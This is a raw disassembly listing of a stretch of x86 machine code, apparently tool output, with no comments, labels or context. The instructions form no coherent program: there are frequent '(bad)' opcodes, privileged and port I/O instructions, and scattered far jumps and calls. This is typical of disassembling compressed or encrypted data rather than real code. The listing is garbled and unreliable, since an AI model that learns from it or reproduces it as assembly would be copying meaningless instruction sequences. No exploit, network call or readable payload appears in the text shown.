  41bd0d:	pop    ss
  41bd0e:	lea    ebp,[bx+di-0x5a7a]
  41bd13:	int3   
  41bd14:	ds mov dh,0x4
  41bd17:	test   BYTE PTR [edx],dh
  41bd19:	jnp    0x41bd33
  41bd1b:	mov    gs,WORD PTR [ecx-0x5e]
  41bd1e:	ins    BYTE PTR es:[edi],dx
  41bd1f:	sub    DWORD PTR [esp+ecx*4],ebp
  41bd22:	xchg   DWORD PTR [edi-0x2d],eax
  41bd25:	mov    cl,0xd5
  41bd27:	repnz mov cl,BYTE PTR [esi]
  41bd2a:	addr16 ret 
  41bd2c:	call   0x5db47bec
  41bd31:	xchg   ebp,eax
  41bd32:	or     BYTE PTR [eax],cl
  41bd34:	mov    ebp,0xd3587190
  41bd39:	or     edx,0xf9f8cc98
  41bd3f:	cwde   
  41bd40:	pop    ss
  41bd41:	add    BYTE PTR [edi],bl
  41bd43:	cmc    
  41bd44:	xchg   esp,eax
  41bd45:	ins    BYTE PTR es:[edi],dx
  41bd46:	fucomp st(7)
  41bd48:	mov    dh,0x99
  41bd4a:	into   
  41bd4b:	pop    esi
  41bd4c:	xchg   edx,eax
  41bd4d:	(bad)  
  41bd4e:	jne    0x41bd0a
  41bd50:	(bad)  
  41bd52:	add    cl,cl
  41bd54:	pop    esp
  41bd55:	imul   eax,esp,0xb5f2e869
  41bd5b:	dec    edi
  41bd5c:	popf   
  41bd5d:	fidiv  WORD PTR [edx-0x76]
  41bd60:	pusha  
  41bd61:	push   ss
  41bd62:	sbb    esi,DWORD PTR [ecx+0x74]
  41bd65:	mov    ds:0x1169c134,eax
  41bd6a:	jae    0x41bdb9
  41bd6c:	pop    es
  41bd6d:	mov    db0,edi
  41bd70:	pop    esp
  41bd71:	test   eax,0xabba7d10
  41bd76:	outs   dx,DWORD PTR ds:[esi]
  41bd77:	addr16 or dl,bl
  41bd7a:	leave  
  41bd7b:	shr    bl,cl
  41bd7d:	test   BYTE PTR [edi-0x76e5961f],0x83
  41bd84:	(bad)  
  41bd85:	adc    DWORD PTR [ecx],esi
  41bd87:	pusha  
  41bd88:	ret    
  41bd89:	outs   dx,BYTE PTR ds:[esi]
  41bd8a:	stc    
  41bd8b:	cmp    BYTE PTR ds:0x118248c4,ah
  41bd91:	adc    DWORD PTR [edi+0x3ccd88d2],edx
  41bd97:	cmc    
  41bd98:	fwait
  41bd99:	push   0x43ca2755
  41bd9e:	(bad)  
  41bd9f:	cmp    esi,DWORD PTR [edi]
  41bda1:	adc    BYTE PTR [ecx+0x58],cl
  41bda4:	(bad)  
  41bda5:	mov    bh,0x8
  41bda7:	mov    fs,ecx
  41bda9:	pushf  
  41bdaa:	cmp    al,0xa7
  41bdac:	icebp  
  41bdad:	sbb    dl,BYTE PTR ds:0xf701357d
  41bdb3:	mov    al,0x23
  41bdb5:	push   0x1ee4f02a
  41bdba:	mov    ah,0xf
  41bdbc:	stc    
  41bdbd:	repz js 0x41bd4a
  41bdc0:	(bad)  
  41bdc1:	fstp   TBYTE PTR [edi-0x5b589933]
  41bdc7:	or     ebx,ecx
  41bdc9:	cmp    BYTE PTR ds:0xd31d95f2,0xd8
  41bdd0:	push   ds
  41bdd1:	dec    ecx
  41bdd2:	cld    
  41bdd3:	ins    DWORD PTR es:[edi],dx
  41bdd4:	repz sbb eax,0x87a8cc7b
  41bdda:	xchg   esp,eax
  41bddb:	lods   al,BYTE PTR ds:[esi]
  41bddc:	leave  
  41bddd:	sub    BYTE PTR [edi],bl
  41bddf:	pop    esp
  41bde0:	sbb    al,0xd6
  41bde2:	imul   esi,DWORD PTR [esi],0x54
  41bde5:	int    0xd4
  41bde7:	ret    0x3f5a
  41bdea:	loop   0x41bd7f
  41bdec:	mov    ah,0xc0
  41bdee:	pop    esp
  41bdef:	push   ebp
  41bdf0:	mov    bl,0x69
  41bdf2:	sbb    eax,0xc1976d97
  41bdf7:	push   esp
  41bdf8:	inc    ebx
  41bdf9:	or     eax,0x360e37e4
  41bdfe:	xor    eax,0x12495343
  41be03:	xchg   DWORD PTR fs:[ecx+eiz*2-0xa],ecx
  41be08:	imul   esi,DWORD PTR [ebp-0x65],0xffffffd6
  41be0c:	push   es
  41be0d:	inc    BYTE PTR [ebx+0x1f36dc4d]
  41be13:	pushf  
  41be14:	invd   
  41be16:	jg     0x41be34
  41be18:	jg     0x41bdde
  41be1a:	rcl    BYTE PTR [edi+0x79],0x76
  41be1e:	jecxz  0x41bdd5
  41be20:	add    esp,eax
  41be22:	jge    0x36eafe67
  41be28:	pop    ss
  41be29:	pop    ss
  41be2a:	out    0x47,al
  41be2c:	outs   dx,BYTE PTR ds:[esi]
  41be2d:	scas   al,BYTE PTR es:[edi]
  41be2e:	data16 jo 0x41be90
  41be31:	inc    edi
  41be32:	inc    ebp
  41be33:	mov    ebp,0x2d875ef5
  41be38:	mov    ebp,0xde696245
  41be3d:	outs   dx,BYTE PTR ds:[esi]
  41be3e:	gs pop ds
  41be40:	loope  0x41be22
  41be42:	mov    esp,0xdc71e4a1
  41be47:	jmp    0x41be07
  41be49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be4a:	jl     0x41bddb
  41be4c:	test   al,0x13
  41be4e:	xchg   ebp,eax
  41be4f:	(bad)  
  41be53:	inc    si
  41be55:	mov    eax,0xb73ef2f
  41be5a:	addr16 int 0x57
  41be5d:	mov    edi,0xec199a79
  41be62:	adc    eax,0x98392907
  41be67:	mov    edi,0x6531123d
  41be6c:	addr16 in eax,0x42
  41be6f:	mov    edi,0xeb0a8eab
  41be74:	(bad)  
  41be75:	push   cs
  41be76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be77:	lods   al,BYTE PTR ds:[esi]
  41be78:	cmc    
  41be79:	sbb    dh,ch
  41be7b:	sub    edx,edx
  41be7d:	pop    edi
  41be7e:	test   al,0xee
  41be80:	out    dx,al
  41be81:	sub    ecx,DWORD PTR [edi-0x21f330d9]
  41be87:	push   esi
  41be88:	ret    0x6103
  41be8b:	out    dx,eax
  41be8c:	in     eax,dx
  41be8d:	mov    WORD PTR [edi+0x4b105daf],es
  41be93:	ins    DWORD PTR es:[edi],dx
  41be94:	or     eax,0x41a713c5
  41be99:	fdivr  st,st(5)
  41be9b:	addr16 jae 0x41be87
  41be9e:	test   eax,0xf7129f35
  41bea3:	call   FWORD PTR [ecx]
  41bea5:	loope  0x41be9f
  41bea7:	jnp    0x41be97
  41bea9:	mov    esp,0x801b91f8
  41beae:	dec    ebp
  41beaf:	pop    es
  41beb0:	mov    dh,0xb5
  41beb2:	(bad)  
  41beb3:	xchg   edi,eax
  41beb4:	sbb    esp,DWORD PTR [ecx+0x32]
  41beb7:	shr    BYTE PTR [ebx+0x78a6f760],cl
  41bebd:	and    DWORD PTR [edx-0x6ab12ae6],edi
  41bec3:	xchg   edi,eax
  41bec4:	cld    
  41bec5:	scas   al,BYTE PTR es:[edi]
  41bec6:	in     al,dx
  41bec7:	mov    bh,0x11
  41bec9:	gs pop esp
  41becb:	repz sbb DWORD PTR [eax],edx
  41bece:	mov    esi,gs
  41bed0:	shl    BYTE PTR [edx+ecx*4+0x64],1
  41bed4:	mov    eax,ds:0x7babdf7d
  41bed9:	ja     0x41be7b
  41bedb:	sbb    eax,DWORD PTR [eax+0x525a4ff8]
  41bee1:	push   0xc8a07aad
  41bee6:	mov    ebx,0x95a35f25
  41beeb:	pop    ecx
  41beec:	jge    0x41be8d
  41beee:	leave  
  41beef:	lock mov ebx,0x828f2b6d
  41bef5:	and    DWORD PTR [esi+0x58],esp
  41bef8:	(bad)  
  41bef9:	int3   
  41befa:	and    ecx,DWORD PTR [eax+ebx*1-0x39]
  41befe:	js     0x41beba
  41bf00:	cmp    ebp,DWORD PTR [ebx+0x5467c00c]
  41bf06:	daa    
  41bf07:	inc    esi
  41bf08:	jbe    0x41bedc
  41bf0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf0b:	jmp    0x2a40:0x57948129
  41bf12:	loop   0x41bea2
  41bf14:	call   0x454555e1
  41bf19:	add    BYTE PTR [edi],bh
  41bf1b:	bound  ebx,QWORD PTR [esi]
  41bf1d:	add    ch,dh
  41bf1f:	sahf   
  41bf20:	sti    
  41bf21:	mov    dh,0xfd
  41bf23:	aad    0x19
  41bf25:	pop    edx
  41bf26:	das    
  41bf27:	pop    edi
  41bf28:	pusha  
  41bf29:	mov    dh,0x9
  41bf2b:	adc    eax,0x5436f9fa
  41bf30:	push   es
  41bf31:	call   0x929036cb
  41bf36:	inc    esi
  41bf37:	sbb    BYTE PTR [edi+ebp*8+0x11],cl
  41bf3b:	xor    eax,DWORD PTR [eax+eax*1-0x55a5f1d7]
  41bf42:	jle    0x41bf11
  41bf44:	add    bh,BYTE PTR [ebx+0x5a]
  41bf47:	sbb    al,0x1a
  41bf49:	xadd   DWORD PTR [ebx-0x7472b6a],ebp
  41bf50:	or     al,0x73
  41bf52:	sbb    esi,edx
  41bf54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf55:	cmc    
  41bf56:	push   esi
  41bf57:	dec    ebx
  41bf58:	and    edx,DWORD PTR [ecx]
  41bf5a:	and    al,0xc3
  41bf5c:	adc    al,0xdd
  41bf5e:	jg     0x41bfd7
  41bf60:	pop    ebp
  41bf61:	leave  
  41bf62:	jp     0x41bf58
  41bf64:	inc    ebp
  41bf65:	sub    bl,dl
  41bf67:	adc    eax,0xe2a944a1
  41bf6c:	push   esp
  41bf6d:	rcl    dl,0x6f
  41bf70:	add    edx,DWORD PTR [esi]
  41bf72:	data16 or al,0xb3
  41bf75:	scas   eax,DWORD PTR es:[edi]
  41bf76:	sbb    DWORD PTR [ebx+0x6a],edx
  41bf79:	inc    ebp
  41bf7a:	push   0xffffffc8
  41bf7c:	jmp    0x41bf9a
  41bf7e:	test   DWORD PTR es:[ecx+0xb9225d8],esi
  41bf85:	pop    ds
  41bf86:	pop    ecx
  41bf87:	pop    ebp
  41bf88:	jp     0x41bfa1
  41bf8a:	adc    DWORD PTR [ebx-0x78bf0363],eax
  41bf90:	(bad)  
  41bf91:	sbb    eax,0x6d1025e8
  41bf96:	jl     0x41bfe2
  41bf98:	lock mov edx,0x778fd920
  41bf9e:	cld    
  41bf9f:	lahf   
  41bfa0:	pop    esi
  41bfa1:	jne    0x41bf3f
  41bfa3:	or     BYTE PTR [esi-0x743c795f],al
  41bfa9:	fwait
  41bfaa:	sbb    eax,0xa12387cb
  41bfaf:	gs loopne 0x41bf5f
  41bfb2:	dec    eax
  41bfb3:	mov    ebx,0xff58051f
  41bfb8:	mov    ah,0x18
  41bfba:	pop    ss
  41bfbb:	xchg   DWORD PTR [ebp+ebp*8+0x4af6f5da],edi
  41bfc2:	ins    BYTE PTR es:[edi],dx
  41bfc3:	pop    ebx
  41bfc4:	inc    eax
  41bfc5:	xor    eax,0x7b320181
  41bfca:	cdq    
  41bfcb:	mov    cl,0x11
  41bfcd:	scas   eax,DWORD PTR es:[edi]
  41bfce:	mov    esi,0x275f4edb
  41bfd3:	and    al,0xad
  41bfd5:	push   0x32d2f399
  41bfda:	je     0x41bf8c
  41bfdc:	xor    edx,esi
  41bfde:	jbe    0x41bfc0
  41bfe0:	mov    DWORD PTR [edi],esi
  41bfe2:	cs test eax,0x4de2bd8f
  41bfe8:	pop    ss
  41bfe9:	adc    ch,BYTE PTR [eax]
  41bfeb:	xchg   ebx,eax
  41bfec:	clc    
  41bfed:	pop    ebx
  41bfee:	iret   
  41bfef:	les    ebp,FWORD PTR [ecx-0x5a]
  41bff2:	mov    cl,0xc3
  41bff4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bff5:	jnp    0x41c060
  41bff7:	xchg   BYTE PTR [ecx-0x15dc5b0d],cl
  41bffd:	pop    es
  41bffe:	ret    
  41bfff:	imul   BYTE PTR [ebx]
  41c001:	adc    ch,0xf9
  41c004:	dec    ecx
  41c005:	scas   eax,DWORD PTR es:[edi]
  41c006:	jmp    0x24d6:0xd055ea07
  41c00d:	sub    bl,al
  41c00f:	enter  0xde77,0x6
  41c013:	xchg   edx,eax
  41c014:	loope  0x41bfa3
  41c016:	fcomip st,st(2)
  41c018:	cmp    BYTE PTR [ebx],0x9d
  41c01b:	jg     0x41c05e
  41c01d:	dec    ebx
  41c01e:	inc    eax
  41c01f:	pop    esi
  41c020:	pusha  
  41c021:	xor    DWORD PTR [edi+0x4b0afbe0],esi
  41c027:	arpl   WORD PTR ds:0x379d182e,cx
  41c02d:	jb     0x41c000
  41c02f:	push   edx
  41c030:	bound  edi,QWORD PTR [esi+0x6f713471]
  41c036:	hlt    
  41c037:	pop    eax
  41c038:	adc    al,0xbd
  41c03a:	push   eax
  41c03b:	int    0x86
  41c03d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c03e:	cmp    BYTE PTR [esi+0x237b7503],ah
  41c044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c045:	pop    ebx
  41c046:	jbe    0x41bfe0
  41c048:	mov    WORD PTR [edi+0x70],ds
  41c04b:	dec    esi
  41c04c:	aad    0x2
  41c04e:	xor    esp,DWORD PTR [ecx-0x22]
  41c051:	inc    ebx
  41c052:	sar    BYTE PTR [esp+esi*4+0x46],cl
  41c056:	cdq    
  41c057:	and    dl,ch
  41c059:	cmp    al,0x29
  41c05b:	add    ebp,DWORD PTR [eax]
  41c05d:	pop    ebp
  41c05e:	cs daa 
  41c060:	in     al,0xca
  41c062:	xchg   ebp,eax
  41c063:	je     0x41c055
  41c065:	pop    esi
  41c066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c067:	mov    al,ds:0x78f4179b
  41c06c:	test   BYTE PTR [esi],dl
  41c06e:	sub    eax,0x377b4886
  41c073:	cmp    al,0xc3
  41c075:	jg     0x41c002
  41c077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c078:	int    0xef
  41c07a:	cmp    al,0x15
  41c07c:	daa    
  41c07d:	add    DWORD PTR [ebp-0x5578995],0x30
  41c084:	sub    esi,esi
  41c086:	xor    eax,0x7536b370
  41c08b:	mov    ebx,0x194b4721
  41c090:	popf   
  41c091:	lods   eax,DWORD PTR ds:[esi]
  41c092:	dec    eax
  41c093:	sar    DWORD PTR es:[ebx+eiz*2+0x36],1
  41c098:	stc    
  41c099:	lds    esp,FWORD PTR [ebx+0x31e31367]
  41c09f:	aas    
  41c0a0:	cmp    eax,0x35e9299
  41c0a5:	jno    0x41c081
  41c0a7:	cli    
  41c0a8:	jbe    0x41c03b
  41c0aa:	ror    BYTE PTR [ecx],cl
  41c0ac:	leave  
  41c0ad:	inc    edx
  41c0ae:	mov    bl,BYTE PTR [ebx+ecx*2]
  41c0b1:	add    al,0x7f
  41c0b3:	in     al,dx
  41c0b4:	adc    eax,0x0
	...
  41c0c1:	retf   
  41c0c2:	test   al,0x91
  41c0c4:	sbb    eax,0xfecf3df3
  41c0c9:	dec    ebp
  41c0ca:	fisub  DWORD PTR [ecx+edi*1-0x1e]
  41c0ce:	(bad)  
  41c0d0:	aas    
  41c0d1:	jno    0x41c110
  41c0d3:	add    DWORD PTR [eax],eax
  41c0d5:	lods   al,BYTE PTR ds:[esi]
  41c0d6:	add    eax,DWORD PTR [eax]
  41c0d8:	add    BYTE PTR [edx],bh
  41c0da:	mov    ebx,0x43f1a4a4
  41c0df:	int3   
  41c0e0:	pop    ss
  41c0e1:	fild   DWORD PTR [eax]
  41c0e3:	(bad)  
  41c0e4:	push   edi
  41c0e5:	mov    WORD PTR [ecx-0x70],es
  41c0e8:	js     0x41c0a3
  41c0ea:	shr    BYTE PTR [edx],0xa5
  41c0ed:	lea    esi,[ebx-0x13]
  41c0f0:	fldenv [edx+0x598772ec]
  41c0f6:	sar    cl,1
  41c0f8:	scas   al,BYTE PTR es:[edi]
  41c0f9:	aaa    
  41c0fa:	or     dh,BYTE PTR [edi+ebx*8]
  41c0fd:	and    al,0xd8
  41c0ff:	in     eax,dx
  41c100:	cmp    BYTE PTR [ebx+0x228aa74f],ah
  41c106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c107:	jmp    0x41c16a
  41c109:	sbb    al,0x2
  41c10b:	pop    esp
  41c10d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c10e:	mov    cl,0xa1
  41c110:	aas    
  41c111:	sbb    eax,0x1bcea991
  41c116:	(bad)  
  41c118:	dec    esp
  41c119:	in     al,dx
  41c11a:	aas    
  41c11b:	mov    dh,0x7d
  41c11d:	push   esp
  41c11e:	adc    dh,ch
  41c120:	cs or  eax,0x5bd9a4ed
  41c126:	pop    ebx
  41c127:	scas   eax,DWORD PTR es:[edi]
  41c128:	ss stos DWORD PTR es:[edi],eax
  41c12a:	js     0x41c199
  41c12c:	loopne 0x41c157
  41c12e:	mov    ecx,0x89cbcace
  41c133:	pop    ecx
  41c134:	jo     0x41c14a
  41c136:	mov    al,ds:0xd8eeeddd
  41c13b:	and    ecx,esp
  41c13d:	mov    ch,0x85
  41c13f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c140:	addr16 add dl,0x68
  41c144:	out    0xf1,eax
  41c146:	out    dx,al
  41c147:	adc    al,0xbf
  41c149:	xchg   esp,eax
  41c14a:	es push edi
  41c14c:	mov    ecx,0x31bbff8a
  41c151:	pop    eax
  41c152:	adc    eax,0x8afddfef
  41c157:	inc    ebp
  41c158:	test   ebp,ebx
  41c15a:	ror    BYTE PTR [ebx+0x53163503],1
  41c160:	aam    0x96
  41c162:	mov    eax,ds:0x12153b18
  41c167:	mov    ebx,0xbd5c088e
  41c16c:	xchg   edx,eax
  41c16d:	jnp    0x41c174
  41c16f:	push   eax
  41c170:	push   edi
  41c171:	mov    ecx,0xdbcce859
  41c176:	lock add edx,esp
  41c179:	sbb    esi,DWORD PTR [ebx]
  41c17b:	push   esp
  41c17c:	into   
  41c17d:	clc    
  41c17e:	cdq    
  41c17f:	xor    al,BYTE PTR [edx]
  41c181:	fldcw  WORD PTR [ebp+0x11]
  41c184:	stos   BYTE PTR es:[edi],al
  41c185:	xor    BYTE PTR [ebp-0x15c11615],dl
  41c18b:	jp     0x41c1e1
  41c18d:	adc    al,0xe4
  41c18f:	add    al,0xf8
  41c191:	cmp    eax,0x7e70815e
  41c196:	push   ecx
  41c197:	pusha  
  41c198:	jns    0x41c12a
  41c19a:	xchg   ecx,eax
  41c19b:	icebp  
  41c19c:	sahf   
  41c19d:	push   es
  41c19e:	mov    cl,0x85
  41c1a0:	cmc    
  41c1a1:	and    esp,DWORD PTR [edx+0x73]
  41c1a4:	enter  0x8b31,0x89
  41c1a8:	jne    0x41c1d6
  41c1aa:	dec    esi
  41c1ab:	xchg   dl,bl
  41c1ad:	mov    ds:0x1b759b65,al
  41c1b2:	daa    
  41c1b3:	repz xor ecx,ecx
  41c1b6:	mov    ds:0x4683c501,al
  41c1bb:	jmp    0xff2c:0x3370f725
  41c1c2:	test   BYTE PTR [ebx-0x6181ed70],0x8a
  41c1c9:	sub    dl,BYTE PTR [ebx+0x33]
  41c1cc:	mov    ch,0x68
  41c1ce:	sahf   
  41c1cf:	iret   
  41c1d0:	push   0x9cf748c0
  41c1d5:	xor    dl,0x25
  41c1d8:	into   
  41c1d9:	lahf   
  41c1da:	cld    
  41c1db:	repnz cmp edx,DWORD PTR [ecx+0x6]
  41c1df:	loop   0x41c161
  41c1e1:	dec    edx
  41c1e2:	inc    eax
  41c1e3:	lahf   
  41c1e4:	xor    eax,0xfef273a5
  41c1e9:	shr    BYTE PTR [ebx-0x5d],cl
  41c1ec:	pop    ds
  41c1ed:	mov    ah,0x3f
  41c1ef:	jae    0x41c237
  41c1f1:	int    0x10
  41c1f3:	jnp    0x41c263
  41c1f5:	sahf   
  41c1f6:	imul   edi
  41c1f8:	aaa    
  41c1f9:	push   esi
  41c1fa:	loop   0x41c1ea
  41c1fc:	loopne 0x41c20f
  41c1fe:	mov    ebp,0xc3f74d49
  41c203:	cwde   
  41c204:	adc    DWORD PTR [esi-0x61],edx
  41c207:	jecxz  0x41c1aa
  41c209:	loope  0x41c1ed
  41c20b:	aam    0x67
  41c20d:	xchg   edx,eax
  41c20e:	and    ebx,ebx
  41c210:	sti    
  41c211:	scas   al,BYTE PTR es:[edi]
  41c212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c213:	std    
  41c214:	out    dx,al
  41c215:	ins    DWORD PTR es:[edi],dx
  41c216:	xor    ebx,DWORD PTR [ebx+0x0]
  41c219:	ins    BYTE PTR es:[edi],dx
  41c21a:	ins    BYTE PTR es:[edi],dx
  41c21b:	in     al,0x27
  41c21d:	daa    
  41c21e:	cwde   
  41c21f:	jge    0x41c289
  41c221:	adc    eax,0x46042fa8
  41c226:	sub    bl,BYTE PTR [esp+ecx*1-0x1b8fffd5]
  41c22d:	jg     0x41c1cb
  41c22f:	(bad)  
  41c230:	pop    ecx
  41c231:	and    ebp,ecx
  41c233:	dec    edi
  41c234:	inc    edi
  41c235:	test   al,0xf2
  41c237:	push   ss
  41c238:	loop   0x41c26f
  41c23a:	aad    0x8
  41c23c:	mov    eax,0xa889c581
  41c241:	jno    0x41c22b
  41c243:	outs   dx,DWORD PTR ds:[esi]
  41c244:	mov    edx,DWORD PTR [edi+0x5a]
  41c247:	push   eax
  41c248:	inc    ecx
  41c249:	mov    ecx,0xd00a45a5
  41c24e:	xchg   ebx,eax
  41c24f:	test   ch,al
  41c251:	fwait
  41c252:	mov    dh,0x7
  41c254:	xchg   edi,eax
  41c255:	pop    ebp
  41c256:	loope  0x41c252
  41c258:	mov    ecx,0xb56c5801
  41c25d:	add    al,0x8b
  41c25f:	xchg   ebp,eax
  41c260:	into   
  41c261:	fild   WORD PTR [esi]
  41c263:	sbb    DWORD PTR [eax+0xc268bc3],esp
  41c269:	test   al,0x62
  41c26b:	adc    eax,0x681c8fc4
  41c270:	test   ebx,ecx
  41c272:	jo     0x41c257
  41c274:	mov    al,ds:0xe3b066cc
  41c279:	mov    ?,WORD PTR [ecx]
  41c27b:	sub    al,0x53
  41c27d:	pop    edi
  41c27e:	xor    al,0x10
  41c280:	push   0x7b0a1454
  41c285:	pop    esi
  41c286:	mov    bh,0xe
  41c288:	jecxz  0x41c302
  41c28a:	rcl    DWORD PTR [edi+eiz*1-0x1a],1
  41c28e:	mov    eax,ds:0x81d80e31
  41c293:	rol    BYTE PTR [edi-0x52],1
  41c296:	int3   
  41c297:	push   ss
  41c298:	xchg   ebx,eax
  41c299:	cmp    al,0xd7
  41c29b:	mov    ah,0xb3
  41c29d:	jle    0x41c29f
  41c29f:	daa    
  41c2a0:	data16 aas 
  41c2a2:	repz ret 
  41c2a4:	call   FWORD PTR [eax+0x6b]
  41c2a7:	pusha  
  41c2a8:	dec    esi
  41c2a9:	sub    DWORD PTR [eax+esi*2-0x26],eax
  41c2ad:	and    eax,0xb437e3e5
  41c2b2:	call   0xdb09:0xa7aed7cb
  41c2b9:	stos   DWORD PTR es:[edi],eax
  41c2ba:	test   BYTE PTR [edi],dh
  41c2bc:	leave  
  41c2bd:	xor    eax,0xa0849420
  41c2c2:	rcr    edi,1
  41c2c4:	test   DWORD PTR [eax-0x5d39d52b],ecx
  41c2ca:	jno    0x41c324
  41c2cc:	xor    dh,BYTE PTR [ebp-0x2306c6df]
  41c2d2:	jnp    0x41c29d
  41c2d4:	lahf   
  41c2d5:	jp     0x41c286
  41c2d7:	sub    BYTE PTR [ebp+ebp*1+0xa11c290],bh
  41c2de:	call   0x9b41152c
  41c2e3:	fiadd  WORD PTR [eax-0x5cfca600]
  41c2e9:	out    0x8f,eax
  41c2eb:	dec    esp
  41c2ec:	inc    esp
  41c2ed:	call   0x3011:0x12ef0cfd
  41c2f4:	pop    ecx
  41c2f5:	pop    ebx
  41c2f6:	mov    ds:0x1deaea12,eax
  41c2fb:	mov    eax,ds:0x2bfc6563
  41c300:	into   
  41c301:	sbb    BYTE PTR [edi],dh
  41c303:	in     al,0x8f
  41c305:	lock call 0x1cd7cd6f
  41c30b:	mov    cs,WORD PTR [esi+0x69f52ec3]
  41c311:	loope  0x41c303
  41c313:	jmp    0x72fe:0xd88f114e
  41c31a:	pop    es
  41c31b:	shl    BYTE PTR [edx-0x7e],0x5f
  41c31f:	jb     0x41c2e2
  41c321:	mov    es,WORD PTR [esp+edx*4]
  41c324:	dec    eax
  41c325:	fist   DWORD PTR [ecx+0x64]
  41c328:	aad    0xbf
  41c32a:	pop    ecx
  41c32b:	push   DWORD PTR [ebx+ebp*8-0x24]
  41c32f:	pop    ss
  41c330:	subps  xmm4,XMMWORD PTR [eax-0x49]
  41c334:	and    ah,ch
  41c336:	sub    eax,DWORD PTR [edx-0x5e71c02e]
  41c33c:	push   esi
  41c33d:	js     0x41c383
  41c33f:	sub    eax,0x405fec46
  41c344:	data16 rcr BYTE PTR ds:0x2897d3bd,cl
  41c34b:	call   0xe9b8f0f
  41c350:	data16 xor dh,BYTE PTR [eax-0x7d0b9972]
  41c357:	rcr    eax,cl
  41c359:	mov    eax,ds:0x61eb9abf
  41c35e:	push   cs
  41c35f:	push   es
  41c360:	mov    ecx,DWORD PTR [edx]
  41c362:	jnp    0x41c387
  41c364:	jbe    0x41c394
  41c366:	bound  edi,QWORD PTR [ecx]
  41c368:	xor    ch,BYTE PTR [edx+edx*8+0x5c4d4e31]
  41c36f:	xor    DWORD PTR ds:0x56566c46,esp
  41c375:	(bad)  
  41c376:	pop    esp
  41c377:	jge    0x41c3c7
  41c379:	lods   eax,DWORD PTR ds:[esi]
  41c37a:	jno    0x41c35a
  41c37c:	adc    DWORD PTR ds:0x22a0fb78,esi
  41c382:	pushf  
  41c383:	sbb    BYTE PTR [edx],al
  41c385:	hlt    
  41c386:	and    eax,0x6ca094a1
  41c38b:	lahf   
  41c38c:	lods   eax,DWORD PTR ds:[esi]
  41c38d:	sbb    edx,DWORD PTR [ebp+0x42]
  41c390:	ins    BYTE PTR es:[edi],dx
  41c391:	call   FWORD PTR fs:[eax+eax*8+0x6e]
  41c396:	dec    ebp
  41c397:	retf   0xd33f
  41c39a:	cmp    eax,0x438fd64
  41c39f:	popa   
  41c3a0:	iret   
  41c3a1:	ja     0x41c382
  41c3a3:	fstp   TBYTE PTR [ecx-0x6]
  41c3a6:	sub    dl,bh
  41c3a8:	and    DWORD PTR [eax],esp
  41c3aa:	mov    eax,ds:0xe85fa8b5
  41c3af:	adc    eax,0x66b26e8c
  41c3b4:	sub    al,0x96
  41c3b6:	push   esi
  41c3b7:	test   al,0x8d
  41c3b9:	xor    ch,BYTE PTR [esi+0x15]
  41c3bc:	hlt    
  41c3bd:	pop    eax
  41c3be:	push   es
  41c3bf:	std    
  41c3c0:	stos   BYTE PTR es:[edi],al
  41c3c1:	and    al,0xb8
  41c3c3:	dec    ebx
  41c3c4:	rol    BYTE PTR [edi-0x16],1
  41c3c7:	mov    eax,0x61765f20
  41c3cc:	ret    0x7709
  41c3cf:	sbb    al,0xa7
  41c3d1:	mov    ch,0xff
  41c3d3:	inc    eax
  41c3d4:	aas    
  41c3d5:	sub    al,0xbc
  41c3d7:	lock jo 0x41c401
  41c3da:	inc    esp
  41c3db:	cmp    al,0x7c
  41c3dd:	lods   eax,DWORD PTR ds:[esi]
  41c3de:	(bad)  
  41c3df:	sbb    al,0x3
  41c3e1:	push   ebp
  41c3e2:	fiadd  WORD PTR [ebp+ebx*2-0x15]
  41c3e6:	sbb    al,0xf
  41c3e8:	nop
  41c3e9:	xchg   BYTE PTR [ecx+ebp*8-0x51],bh
  41c3ed:	push   0x41
  41c3ef:	jg     0x41c376
  41c3f1:	xor    DWORD PTR [ebx+0x3d0cf86c],eax
  41c3f7:	lds    ebx,FWORD PTR [ebx-0x585497a0]
  41c3fd:	pusha  
  41c3fe:	adc    eax,0x453c45d3
  41c403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c404:	inc    ebx
  41c405:	iret   
  41c406:	xor    edx,DWORD PTR [ebx]
  41c408:	sbb    al,0xa2
  41c40a:	aas    
  41c40b:	jle    0x41c412
  41c40d:	pop    edx
  41c40e:	pop    edi
  41c40f:	stos   DWORD PTR es:[edi],eax
  41c410:	lea    edi,[edx+0xe]
  41c413:	jl     0x41c3ba
  41c415:	xchg   ecx,eax
  41c416:	lea    esp,[ebx]
  41c418:	js     0x41c467
  41c41a:	data16 adc dh,BYTE PTR [ecx]
  41c41d:	or     ebx,DWORD PTR [esi+0x6dae21aa]
  41c423:	cmc    
  41c424:	push   esi
  41c425:	jne    0x41c3d9
  41c427:	retf   
  41c428:	js     0x41c3f8
  41c42a:	pop    esp
  41c42b:	dec    ecx
  41c42c:	push   esi
  41c42d:	ret    0xba20
  41c430:	add    eax,0x7f9289a1
  41c435:	jg     0x41c49e
  41c437:	jge    0x41c4ac
  41c439:	lahf   
  41c43a:	sti    
  41c43b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c43c:	ja     0x41c45f
  41c43e:	cmp    dh,BYTE PTR [ecx]
  41c440:	push   es
  41c441:	out    dx,al
  41c442:	jmp    0x41c468
  41c444:	add    bl,BYTE PTR [edi-0x73]
  41c447:	sbb    BYTE PTR [ecx],0x4
  41c44a:	jno    0x41c411
  41c44c:	cmc    
  41c44d:	pop    ebx
  41c44e:	xchg   esp,eax
  41c44f:	and    al,0x9f
  41c451:	jbe    0x41c491
  41c453:	outs   dx,BYTE PTR ds:[esi]
  41c454:	js     0x41c3d6
  41c456:	outs   dx,BYTE PTR ds:[esi]
  41c457:	pop    ecx
  41c458:	mov    esp,0xeecac8f8
  41c45d:	call   FWORD PTR [ecx-0x20]
  41c460:	inc    edx
  41c461:	jb     0x41c4a1
